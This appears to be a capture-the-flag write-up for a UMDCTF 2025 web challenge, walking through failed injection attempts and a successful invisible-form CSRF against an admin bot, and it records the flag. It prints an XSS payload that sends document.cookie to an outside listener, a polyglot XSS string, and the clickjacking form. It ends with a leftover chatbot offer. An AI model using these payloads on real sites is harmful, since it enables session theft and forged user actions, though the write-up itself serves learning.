# A Minecraft Movie - UMDCTF 2025 Writeup

## Challenge Overview
We are given access to a web application where users can register accounts, create posts, and view posts by others. Our goal is to exploit the application and retrieve the flag.
![image](https://github.com/user-attachments/assets/8caefb87-360f-4be6-b6d2-12bbf7fdca71)

---

## Reconnaissance
After registering an account and logging in, we explore the basic functionality:
- Users can **create posts** by submitting a title and content.
- Posts can be **liked or disliked** by other users.
- An **admin bot** visits submitted posts when we provide a `postId`.
    


---

### Login Page Testing
Initial attempts were made to perform **SQL injection (SQLi)** on the login page (e.g., `admin' --`) to bypass authentication, but these attempts failed.

---

### Post Creation Testing
We explored several types of input-based vulnerabilities:
- **SQL Injection** in post fields (title, content) — unsuccessful.
- **Server-Side Template Injection (SSTI)** payloads — unsuccessful.
- **Cross-Site Scripting (XSS)** payloads — initially unsuccessful.

During post creation, we noticed two separate HTTP requests:
1. An initial request to create the post.
2. A second request sending the content (title and body).

Attempts to tamper with cookies during these requests resulted in `401 Unauthorized` errors.

We also observed that the session cookie remained **static**, meaning anyone with the same cookie value could impersonate a user session. This was noted for potential later use, as well as the format of the Title and Content of our post being submitted:
![image](https://github.com/user-attachments/assets/b138b8f8-a7db-4441-8bf9-52990c55ac0d)

---

### Post ID Observations

After creating posts, we observed how posts are fetched:

- A second HTTP request retrieves the post using a **UUID-like `postId`**.
    
- These UUIDs appeared **randomly generated** with no clear pattern.
    

![image](https://github.com/user-attachments/assets/c0ccabd0-126e-46fe-9a76-8e4ed6704a38)
![image](https://github.com/user-attachments/assets/f3e3ad84-2dfa-4294-ae3c-0d14e71af344)


Example observed post IDs:

```
6a75eeed-2128-47f2-a552-a9dca81ebd81
2d5f5bbd-3ebf-4ba5-9fc0-2f7d5f3a6026
...
```

Further brute-forcing to find any similarity or predictability in post IDs was not going to work.

---

### Admin Interaction

The application includes another page where users can **submit their `postId`** for the admin bot to view and interact with (like or dislike).

![image](https://github.com/user-attachments/assets/0fe40092-c44e-4b01-85b9-bbbe9711a17e)

Inspecting the page source revealed that the post IDs are used in a hidden form field, showing the format of all the post IDs.

![image](https://github.com/user-attachments/assets/d3d2fe34-c0aa-422c-8cf8-c037873338ca)

At this point, we theorized that the intended exploit path involved getting the admin to **visit a malicious post**.

---

## Exploitation

### Attempted XSS Payloads

Since SQLi and SSTI attempts failed, we focused on **XSS** to try to capture the admin’s session cookie.

First, we analyzed how the website displayed our post onto the page to look for any attributes, such as a script attribute that we could try to manipulate:

![image](https://github.com/user-attachments/assets/f1da32ca-8a7f-4ba9-a36d-f05c436e06bb)


We attempted to inject payloads into the post content and title:

```html
</textarea><img src=x onerror="fetch('http://192.168.40.237:8888?cookie=' + btoa(document.cookie))">
```

However, despite submitting the `postId` to the admin and running a listener, the request was indeed received, but no cookies were being sent.

---

### Analyzing the Filtering

We further investigated how the site filtered user input:

- **Direct `<script>` tags were removed** entirely.
    
- Anything inside `< >` was heavily sanitized.
    
- Some tag closing patterns could be injected to break HTML structure, e.g., `</h2><script>alert(1)</script>` — but most attempts failed.
    

I tried to use a Polygot payload to see what else may be filtered:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/ -!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

![image](https://github.com/user-attachments/assets/8c48a648-8f39-4a33-9b6c-c12630787c33)


Despite these attempts, **all JavaScript execution was filtered**. Anything between `< >` was neutralized.

I tried these other approaches, but all failed to alert the page:

```html
" onmouseover="alert(1)
' onclick='alert(1)
javascript:alert(1)
" autofocus onfocus=alert(1) "
```

---

### Observations from other posts

While browsing public posts, we noticed some posts successfully embedded YouTube links. We attempted to recreate this but all `<iframe>` and other embed tags were sanitized, and content was displayed as plain text.

---

### Figuring out the solution - CSRF attack

Upon looking into it further, we can see that the page to submit our post to an admin says "Think you can get an admin to like your post?", hinting that we needed to get an admin to like our post to get the flag, not steal their login cookie.

We pivoted to a **Cross-Site Request Forgery (CSRF)**-based attack to do this.

The idea:
- When the admin visits our post, we could automatically **submit a hidden form**.
- The form would **send a POST request** to the site's like/dislike endpoint with the necessary parameters.
    

Payload used:

```html
<form action="https://a-minecraft-movie-api.challs.umdctf.io/legacy-social" method="POST">
  <input name="sessionNumber" value="23">
  <input name="postId" value="e7181b50-1d30-4c07-ba37-4350383322e3">
  <input name="likes" value="1">
  <input type="submit" autofocus style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0">
</form>
```

Explanation:
- The form is styled to be **invisible** and **auto-focused**.
- Any interaction (even a click or keypress) would **trigger form submission**.
- This would cause the admin to like our post without their knowledge.
    

We submitted this crafted post, and after the admin bot visited it, the flag was retrieved.

---

## Final Flag

```
UMDCTF{I_y3@RNeD_f0R_7HE_Min3S}
```

---

Would you also like me to help you create an even more **CTF competition-ready markdown version** of this? (so you could copy-paste it directly into a GitHub repo or share cleanly?) 🚀  
Would take me 1 more step!
